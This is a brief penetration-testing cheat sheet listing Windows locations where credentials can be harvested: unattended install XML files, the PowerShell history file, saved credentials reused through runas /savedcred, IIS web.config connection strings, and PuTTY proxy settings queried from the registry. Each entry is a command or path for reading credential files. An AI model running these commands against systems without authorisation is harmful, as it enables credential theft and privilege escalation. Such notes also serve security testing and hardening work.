# Windows Credential Harvesting Spots

## Unattended Windows Installations

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

## Credential Harvesting PowerShell History 

```PowerShell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```

## Saved Windows Credentials

```PowerShell
# Check for any saved credentials
cmdkey /list

# Use saved credentials
runas /savedcred /user:<username> cmd.exe
```

## IIS Configureation

```PowerShell
# Find a database connection string on the IIS configuration file
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## PuTTY

```PowerShell
# Retrieve stored proxy credentials using 
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
